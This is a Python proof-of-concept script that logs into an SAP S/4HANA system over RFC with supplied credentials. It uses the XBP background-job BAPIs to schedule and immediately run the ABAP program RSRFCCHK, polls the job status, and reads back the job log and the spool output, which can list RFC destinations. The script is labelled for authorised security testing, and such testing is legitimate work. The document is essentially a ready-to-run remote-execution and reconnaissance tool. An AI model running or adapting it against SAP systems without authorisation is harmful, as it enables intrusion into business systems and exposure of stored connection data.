#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC: Remote ABAP Program Execution via XBP Job Scheduling
Schedules and runs RSRFCCHK on a remote S/4HANA system using BAPI_XBP_* function modules.

For authorized security testing only.

Dependencies: pyrfc (pip install pyrfc)
Requires SAP NWRFC SDK installed: https://support.sap.com/en/product/connectors/nwrfcsdk.html
"""

import sys
import time
import argparse
from pyrfc import Connection


EXTERNAL_USER = 'POCUSER'
JOB_NAME = 'POC_RSRFCCHK'
ABAP_PROGRAM = 'RSRFCCHK'
POLL_INTERVAL = 3
MAX_POLL_ATTEMPTS = 40


def connect(args):
    """Establish RFC connection to target S/4HANA system."""
    print(f"[*] Connecting to {args.ashost} SID={args.sysnr} client={args.client} user={args.user}")
    conn = Connection(
        ashost=args.ashost,
        sysnr=args.sysnr,
        client=args.client,
        user=args.user,
        passwd=args.passwd
    )
    print("[+] Connected")
    return conn


def xmi_logon(conn):
    """Log on to the XMI/XBP interface (required before any BAPI_XBP_* calls)."""
    print("[*] Logging on to XBP interface via BAPI_XMI_LOGON...")
    result = conn.call(
        'BAPI_XMI_LOGON',
        EXTCOMPANY='POCTEST',
        EXTPRODUCT='POCSCRIPT',
        INTERFACE='XBP',
        VERSION='3.0'
    )

    if result.get('RETURN', {}).get('TYPE', '') in ('E', 'A'):
        print(f"[-] XMI logon failed: {result['RETURN']['MESSAGE']}")
        sys.exit(1)

    print("[+] XBP interface logon successful")


def xmi_logoff(conn):
    """Log off from the XMI/XBP interface."""
    try:
        conn.call(
            'BAPI_XMI_LOGOFF',
            INTERFACE='XBP'
        )
        print("[*] XBP interface logoff done")
    except Exception:
        pass


def job_open(conn):
    """Step 1: Open a new background job."""
    print(f"[*] Opening job '{JOB_NAME}'...")
    result = conn.call(
        'BAPI_XBP_JOB_OPEN',
        JOBNAME=JOB_NAME,
        EXTERNAL_USER_NAME=EXTERNAL_USER
    )

    if result.get('RETURN', {}).get('TYPE', '') in ('E', 'A'):
        print(f"[-] Error opening job: {result['RETURN']['MESSAGE']}")
        sys.exit(1)

    jobcount = result['JOBCOUNT']
    print(f"[+] Job opened: {JOB_NAME} / {jobcount}")
    return jobcount


def job_add_step(conn, jobcount, variant=''):
    """Step 2: Add ABAP program step to the job."""
    print(f"[*] Adding ABAP step: program={ABAP_PROGRAM}" +
          (f" variant={variant}" if variant else ""))

    params = {
        'JOBNAME': JOB_NAME,
        'JOBCOUNT': jobcount,
        'EXTERNAL_USER_NAME': EXTERNAL_USER,
        'ABAP_PROGRAM_NAME': ABAP_PROGRAM,
    }
    if variant:
        params['ABAP_VARIANT_NAME'] = variant

    result = conn.call('BAPI_XBP_JOB_ADD_ABAP_STEP', **params)

    if result.get('RETURN', {}).get('TYPE', '') in ('E', 'A'):
        print(f"[-] Error adding step: {result['RETURN']['MESSAGE']}")
        sys.exit(1)

    print(f"[+] Step added (step count: {result.get('STEP_COUNT', '?')})")


def job_close(conn, jobcount):
    """Step 3: Close the job."""
    print("[*] Closing job...")
    result = conn.call(
        'BAPI_XBP_JOB_CLOSE',
        JOBNAME=JOB_NAME,
        JOBCOUNT=jobcount,
        EXTERNAL_USER_NAME=EXTERNAL_USER
    )

    if result.get('RETURN', {}).get('TYPE', '') in ('E', 'A'):
        print(f"[-] Error closing job: {result['RETURN']['MESSAGE']}")
        sys.exit(1)

    print("[+] Job closed")


def job_start(conn, jobcount):
    """Step 4: Release and start the job immediately."""
    print("[*] Starting job immediately via BAPI_XBP_JOB_START_IMMEDIATELY...")
    result = conn.call(
        'BAPI_XBP_JOB_START_IMMEDIATELY',
        JOBNAME=JOB_NAME,
        JOBCOUNT=jobcount,
        EXTERNAL_USER_NAME=EXTERNAL_USER
    )

    if result.get('RETURN', {}).get('TYPE', '') in ('E', 'A'):
        print(f"[-] Error starting job: {result['RETURN']['MESSAGE']}")
        sys.exit(1)

    print("[+] Job released and started")


def job_wait(conn, jobcount):
    """Poll job status until finished or aborted."""
    print(f"[*] Polling job status (every {POLL_INTERVAL}s, max {MAX_POLL_ATTEMPTS} attempts)...")

    status_map = {
        'S': 'Scheduled',
        'R': 'Released',
        'Y': 'Ready',
        'P': 'Dispatched',
        'A': 'Active',
        'F': 'Finished',
        'X': 'Aborted',
    }

    for attempt in range(1, MAX_POLL_ATTEMPTS + 1):
        result = conn.call(
            'BAPI_XBP_JOB_STATUS_GET',
            JOBNAME=JOB_NAME,
            JOBCOUNT=jobcount,
            EXTERNAL_USER_NAME=EXTERNAL_USER
        )

        status = result.get('STATUS', '?')
        label = status_map.get(status, f'Unknown({status})')
        print(f"    [{attempt}/{MAX_POLL_ATTEMPTS}] Status: {label}")

        if status == 'F':
            print("[+] Job finished successfully")
            return True
        elif status == 'X':
            print("[-] Job aborted")
            return False

        time.sleep(POLL_INTERVAL)

    print("[-] Timeout waiting for job completion")
    return False


def job_read_log(conn, jobcount):
    """Read the job log after execution."""
    print("[*] Reading job log...")
    try:
        result = conn.call(
            'BAPI_XBP_JOB_JOBLOG_READ',
            JOBNAME=JOB_NAME,
            JOBCOUNT=jobcount,
            EXTERNAL_USER_NAME=EXTERNAL_USER
        )

        log_lines = result.get('JOB_PROTOCOL_NEW', []) or result.get('JOB_PROTOCOL', [])
        if log_lines:
            print(f"[+] Job log ({len(log_lines)} entries):")
            print("-" * 72)
            for line in log_lines:
                text = line.get('TEXT', line.get('MESSAGETXT', str(line)))
                print(f"    {text}")
            print("-" * 72)
        else:
            print("[*] No job log entries returned")

    except Exception as e:
        print(f"[!] Could not read job log: {e}")


def job_read_spool(conn, jobcount):
    """Attempt to read spool output (RSRFCCHK writes to spool)."""
    print("[*] Reading spool list...")
    try:
        result = conn.call(
            'BAPI_XBP_JOB_SPOOLLIST_READ',
            JOBNAME=JOB_NAME,
            JOBCOUNT=jobcount,
            STEP_NUMBER=1,
            EXTERNAL_USER_NAME=EXTERNAL_USER
        )

        spool_lines = result.get('SPOOL_LIST', [])
        if spool_lines:
            print(f"[+] Spool output ({len(spool_lines)} lines):")
            print("=" * 72)
            for line in spool_lines:
                print(line.get('LINE', str(line)))
            print("=" * 72)
        else:
            print("[*] No spool output returned (check SM37/SP01 on target)")

    except Exception as e:
        print(f"[!] Could not read spool: {e}")


def main():
    parser = argparse.ArgumentParser(
        description='PoC: Remote ABAP execution of RSRFCCHK via XBP job scheduling'
    )
    parser.add_argument('--ashost', required=True, help='SAP application server hostname/IP')
    parser.add_argument('--sysnr', default='00', help='System number (default: 00)')
    parser.add_argument('--client', default='100', help='Client number (default: 100)')
    parser.add_argument('--user', required=True, help='SAP username')
    parser.add_argument('--passwd', required=True, help='SAP password')
    parser.add_argument('--variant', default='', help='Optional ABAP variant for RSRFCCHK')
    args = parser.parse_args()

    conn = connect(args)

    try:
        xmi_logon(conn)

        jobcount = job_open(conn)
        job_add_step(conn, jobcount, variant=args.variant)
        job_close(conn, jobcount)
        job_start(conn, jobcount)

        if job_wait(conn, jobcount):
            job_read_log(conn, jobcount)
            job_read_spool(conn, jobcount)
        else:
            job_read_log(conn, jobcount)
            print("[-] Job did not finish successfully. Check SM37 on target system.")

        xmi_logoff(conn)
    finally:
        conn.close()
        print("[*] Connection closed")


if __name__ == '__main__':
    main()
